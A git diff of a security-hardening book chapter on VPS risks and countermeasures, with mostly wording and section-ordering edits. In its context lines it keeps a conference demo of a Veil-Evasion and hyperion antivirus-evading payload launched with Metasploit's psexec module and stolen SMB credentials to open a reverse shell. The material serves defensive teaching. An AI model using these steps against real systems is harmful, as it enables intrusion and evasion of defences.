@@ -5,14 +5,14 @@
 If possible, I usually advocate bringing VPS(s) [in-house](http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/) where you have control. A lot of the ideas in this section originated from a blog post of mine on [hardening Debian web servers](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/).
 
 ## 1. SSM Asset Identification
-Take results from [higher level Asset Identification](#ssm-asset-identification). Remove any that are not applicable. Add any newly discovered.
+Take results from [higher level Asset Identification](#ssm-asset-identification). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:
 
-* Ownership. At first this may sound strange, but that's because of an assumption you may have that it's a given that you will always own, or at least have control of your server. I'm going to dispel this myth. When an attacker wants to compromise your server, they want to do so for a reason. Possibly it's just for kicks, possibly it's for some more sinister reason. They want an asset that presumably belongs to you or your organisation. If they can take control of your server (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets that don't belong to them. With this in mind, you could think of your server as an asset. On the other hand you could think of it as a liability. Both may be correct. In any case, you need to protect it and in many cases take it to school and teach it how to protect itself. This is covered under the [SSM Countermeasures](#vps-countermeasures) section with items such as HIDS and Logging and Alerting.
+* Ownership. At first this may sound strange, but that is because of an assumption you may have that it is a given that you will always own, or at least have control of your server(s). I am going to dispel this myth. When an attacker wants to compromise your server(s), they want to do so for a reason. Possibly it is just for kicks, possibly it is for some more sinister reason. They want an asset that presumably belongs to you, your organisation, or your customers. If they can take control of your server(s) (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets that do not belong to them. With this in mind, you could think of your server(s) as an asset. On the other hand you could think of your it as a liability. Both may be correct. In any case, you need to protect your server(s) and in many cases take it to school and teach it how to protect itself. This is covered under the [SSM Countermeasures](#vps-countermeasures) section with items such as HIDS and Logging and Alerting.
 * Taking the confidential business and client information from the "Starting with the 30,000' view" chapter, here we can concretise these concepts into forms such as:
   * Email, Web, Data-store servers and of course the data on them.
-  * You could even stretch this to individuals PC's and other devices which may be carrying this sort of confidential information on them. Mobile devices are a huge risk for example (covered in the [Mobile](#mobile) chapter)
+  * You could even stretch this to individuals PCs and other devices which may be carrying this sort of confidential information on them. Mobile devices are a huge risk for example (covered in the [Mobile](#mobile) chapter)
 
-This is probably an incomplete list for your domain. I've given you a start. Put your thinking cap on and populate the rest, or come back to it as additional assets enter your mind.
+This is probably an incomplete list for your domain. I have given you a start. Put your thinking cap on and populate the rest, or come back to it as additional assets enter your mind.
 
 ## 2. SSM Identify Risks
 Go through same process as we did at the [top level](#ssm-identify-risks), but for your VPS(s).
@@ -26,15 +26,19 @@ Go through same process as we did at the [top level](#ssm-identify-risks), but f
 
 In terms of security, unless your provider is [Swiss](http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal), you give up so much when you forfeit your system(s) to an external provider. I cover this in my talk ["Does Your Cloud Solution Look Like a Mushroom"](http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom).
 
-* If you don't own your VPS(s), you will have very limited security, visibility and control over the infrastructure.
-* Limited (at best) visibility into any hardening process your CSP takes. Essentially you "Get what you're given".
-* Cloud and hosting providers are in many cases forced by governments and other agencies to give up your secrets. It's very common place now and you may not even know that it has happened. Swiss providers may be the exception here.
-* What control do you have that if you're data in the cloud has been compromised you actually know about it and can invoke your incident response team(s) and procedures?
-* Cloud and hosting providers are readily giving up your secrets to government organisations and the highest bidders. In many cases you won't know about it.
+* If you do not own your VPS(s), you will have very limited security, visibility and control over the infrastructure.
+* Limited (at best) visibility into any hardening process your CSP takes. Essentially you "Get what you are given".
+* Cloud and hosting providers are in many cases forced by governments and other agencies to give up your secrets. It is very common place now and you may not even know that it has happened. Swiss providers may be the exception here.
+* What control do you have that if you are data in the cloud has been compromised you actually know about it and can invoke your incident response team(s) and procedures?
+* Cloud and hosting providers are readily giving up your secrets to government organisations and the highest bidders. In many cases you will not know about it.
 * Your provider may go out of business and you may get little notice of this.
-* Providers are outsourcing their outsourced services to several providers deep. They don't even have visibility themselves. Control is lost.
+* Providers are outsourcing their outsourced services to several providers deep. They do not even have visibility themselves. Control is lost.
 * \> distribution = > attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?
 * Your provider knows little (at best) about your domain, how you operate, or what you have running on their system(s). How are they supposed to protect you if they have no knowledge of your domain?
+
+### Lack of Visibility
+
+_Todo_
 
 ### Using Components with Known Vulnerabilities
 
@@ -71,18 +75,18 @@ The Metasploit PSExec module (`exploit/windows/smb/psexec`) uses basically the s
 {#wdcnz-demo-5}
 ![](images/HandsOnHack.png)
 
-The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) will provide some additional context and it's probably best to look at it first if you haven't already.
+The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) will provide some additional context and it is probably best to look at it first if you have not already.
 
 You can find the video of how it is played out [here](https://www.youtube.com/watch?v=1EvwwYiMrV4).
 
 I> ## Synopsis
 I>
-I> This demo differs from the previous in that we don't rely on any of the targets direct interaction. There is no longer a need for the browser.  
+I> This demo differs from the previous in that we do not rely on any of the targets direct interaction. There is no longer a need for the browser.  
 I> We open a reverse shell from the victim to us using Metasploit.  
 I> We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.  
 I> With this attack you will have had to have obtained the targets username and password or password hash.  
 I> We leverage PSExec which expects your binary to be a windows service.
-I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I haven't included these steps in this play though, although the video assumes they have been included.
+I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assumes they have been included.
 
 {icon=bomb}
 G> ## The Play
@@ -95,10 +99,10 @@ G> `list`
 G>
 G> Choose a service because we are going to use psexec to install it on the targets box and we want to open a reverse shell:  
 G> `use 4`  
-G> That's `c/meterpreter/rev_http_service`
+G> That is `c/meterpreter/rev_http_service`
 G>
 G> Set any options here:  
-G> `set lhost <IP address that we're going to be listening on for the reverse shell>`  
+G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
 G>
 G> Generate the initial payload:  
 G> `generate`
@@ -112,14 +116,14 @@ G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute
 G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
 G> We then put the encrypted payload somewhere where Metasploit can access it:  
 G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
-G> We then tell Metasploit where we've put it.  
+G> We then tell Metasploit where we have put it.  
 G> I created a Metasploit resource file:  
 G> `cat ~/demo.rc`
 G>
 G> `use exploit/windows/smb/psexec`  
 G> `set payload windows/meterpreter/reverse_http`  
 G> `set lport 8080`  
-G> `set lhost <IP address that we're going to be listening on for the reverse shell>`  
+G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
 G> `set rhost <IP address of target>`  
 G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
 G> `set smbuser <target username>`  
@@ -127,12 +131,12 @@ G> `set smbpass <target password>`
 G> `run`
 G>
 G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.  
-G> Now we've got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
+G> Now we have got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
 
 {icon=bomb}
 G> We now run msfconsole with the resource file as parameter:  
 G> `msfconsole -r ~/demo.rc`  
-G> and that's enough to evade AV and get our reverse shell.
+G> and that is enough to evade AV and get our reverse shell.
 G>
 G> `sessions` will show you the active sessions you have.  
 G> To interact with the first one:  
@@ -160,16 +164,54 @@ _Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-We
 
 Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. Cloud offerings are often more expensive in monetary terms for medium to large environments.
 
+### Lack of Visibility
+
+#### Host Intrusion Detection Systems (HIDS) {#vps-countermeasures-host-intrusion-detection-systems-hids}
+![](images/ThreatTags/PreventionAVERAGE.png)
+
+I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/05/30/evaluation-of-host-intrusion-detection-systems-hids/) of a couple of HIDS. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#hids). 
+
+_Todo_ Elaborate
+
+#### Logging and Alerting
+![](images/ThreatTags/PreventionAVERAGE.png)
+
+I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/04/25/web-server-log-management/) of a small collection of logging and alerting offerings. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#logging-alerting-and-monitoring).
+
+It is very important to make sure you have reliable and all-encompassing logging to an off-site location. This way attackers will have to also compromise that location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).
+
+_Todo_ Elaborate
+
+#### Monitoring
+![](images/ThreatTags/PreventionAVERAGE.png)
+
+I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#the-following-are-better-suited-to-monitoring) of a collection of tools that one of their responsibilities was monitoring and performing actions on your processes and applications.
+
+1. Supervisor [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#supervisor)
+2. Monit [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#monit)
+ * [Deep dive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#getting-started-with-monit) into Monit. What happens if the process we use to monitor stops working? [Keep Monit Alive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#keep-monit-alive)
+3. Passenger [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#passenger)
+
 ### Using Components with Known Vulnerabilities
 
 _Todo_ Patching.
 Similar section in network chapter.
 https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities
 
+### Windows
+
+#### PSExec {#vps-countermeasures-psexec}
+
+_Todo_: How hard is prevention?
+
+![](images/ThreatTags/Prevention.png)
+
+_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1)
+
 ### Minimise Attack Surface by [Granular Partitioning](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#partitioning)
 ![](images/ThreatTags/PreventionAVERAGE.png)
 
-By creating many partitions and [applying the least privileges](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#lock-down-the-mounting-of-partitions) necessary to each in order to be useful, you're making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to. This is where you play with your `/etc/fstab`
+By creating many partitions and [applying the least privileges](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#lock-down-the-mounting-of-partitions) necessary to each in order to be useful, you are making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to. This is where you play with your `/etc/fstab`
 
 This is a similar concept to tightly [constraining](http://blog.binarymist.net/2012/11/04/sanitising-user-input-from-browser-part-1/#minimising-the-attack-surface) input fields to only be able to accept structured data (names (alpha only) dates, social security numbers, zip codes, email addresses, etc) rather than just leaving the input wide open to be able to enter any text.
 
@@ -178,7 +220,7 @@ This is a similar concept to tightly [constraining](http://blog.binarymist.net/2
 ### Minimise Attack Surface by Installing [Only what you Need](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#continuing-with-the-install)
 ![](images/ThreatTags/PreventionVERYEASY.png)
 
-This pretty much goes without saying I think, unless you're setting up a Windows server with "all the stuff" that you have no control over. Which is why I prefer UNIX based servers. I have all the control. If anything goes wrong, it's usually my own fault.
+This pretty much goes without saying I think, unless you are setting up a Windows server with "all the stuff" that you have no control over. Which is why I prefer UNIX based servers. I have all the control. If anything goes wrong, it is usually my own fault.
 
 ### Review Password Strategies
 ![](images/ThreatTags/PreventionEASY.png)
@@ -207,58 +249,34 @@ Just another attack vector that should be removed
 ### Disable, Remove Services. Harden what's left
 ![](images/ThreatTags/PreventionEASY.png)
 
-There are often a few services you can [disable](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-services-we-dont-need) even on a bare bones Debian install and some that are just easier to [remove](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#remove-services). Then go through the process of [hardening](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#secure-services) what's left. Make sure you test before and after each service you attack. Watch the port being open/closed, etc.
+There are often a few services you can [disable](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-services-we-dont-need) even on a bare bones Debian install and some that are just easier to [remove](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#remove-services). Then go through the process of [hardening](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#secure-services) what is left. Make sure you test before and after each service you attack. Watch the port being open/closed, etc.
 
 ### [Schedule Backups](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#scheduled-backups)
 ![](images/ThreatTags/PreventionEASY.png)
 
-and make sure you can restore from them. Yes it's extra work, but work that will be invaluable if those backups don't restore.  
+and make sure you can restore from them. Yes it is extra work, but work that will be invaluable if those backups do not restore.  
 Also consider setting up automatic updates.
-
-### Host Intrusion Detection Systems (HIDS) {#vps-countermeasures-host-intrusion-detection-systems-hids}
-![](images/ThreatTags/PreventionAVERAGE.png)
-
-I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/05/30/evaluation-of-host-intrusion-detection-systems-hids/) of a couple of HIDS. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#hids). 
-
-### Logging and Alerting
-![](images/ThreatTags/PreventionAVERAGE.png)
-
-I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/04/25/web-server-log-management/) of a small collection of logging and alerting offerings. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#logging-alerting-and-monitoring).
-
-It's very important to make sure you have reliable and all-encompassing logging to an off-site location. This way attackers will have to also compromise that location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).
-
-### Monitoring
-![](images/ThreatTags/PreventionAVERAGE.png)
-
-I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#the-following-are-better-suited-to-monitoring) of a collection of tools that one of their responsibilities was monitoring and performing actions on your processes and applications.
-
-1. Supervisor [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#supervisor)
-2. Monit [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#monit)
- * [Deep dive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#getting-started-with-monit) into Monit. What happens if the process we use to monitor stops working? [Keep Monit Alive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#keep-monit-alive)
-3. Passenger [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#passenger)
 
 ### Host Firewall
 ![](images/ThreatTags/PreventionEASY.png)
 
-[This](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#fire-walling) is one of the last things you should look at. In fact, it's not really needed if you've taking the time to remove unnecessary services and harden what's left. If you use a host firewall keep your set of rules to a minimum to reduce confusion and increase legibility. Maintain both ingress & egress.
-
-### Windows
-
-#### PSExec {#vps-countermeasures-psexec}
-
-_Todo_: How hard is prevention?
-
-![](images/ThreatTags/Prevention.png)
-
-_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1)
+[This](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#fire-walling) is one of the last things you should look at. In fact, it is not really needed if you have taking the time to remove unnecessary services and harden what is left. If you use a host firewall keep your set of rules to a minimum to reduce confusion and increase legibility. Maintain both ingress & egress.
 
 ## 4. SSM Risks that Solution Causes
 > Are there any? If so what are they?
 
-* Just beware that if you're intending to break the infrastructure or even what's running on your VPS(s) if they're hosted on someone else's infrastructure, that you make sure you have all the tests you intend to carry out documented including what could possibly go wrong, accepted and signed by your provider. Good luck with this. That's why I usually recommend self hosting.
-* Keep in mind: that if you don't break your system(s), someone else will.
+* Just beware that if you are intending to break the infrastructure or even what is running on your VPS(s) if they are hosted on someone else's infrastructure, that you make sure you have all the tests you intend to carry out documented including what could possibly go wrong, accepted and signed by your provider. Good luck with this. That is why I usually recommend self hosting.
+* Keep in mind: that if you do not break your system(s), someone else will.
 * Possible time constraints: It takes time to find skilled workers, gain expertise, set-up and configure.
-* Many of the points I've raised around VPS hardening require maintenance.
+* Many of the points I have raised around VPS hardening require maintenance.
+
+### Lack of Visibility
+
+_Todo_
 
 ## 5. SSM Costs and Trade-offs
-> An exercise for the reader. What are they?
+
+### Lack of Visibility
+
+_Todo_
+
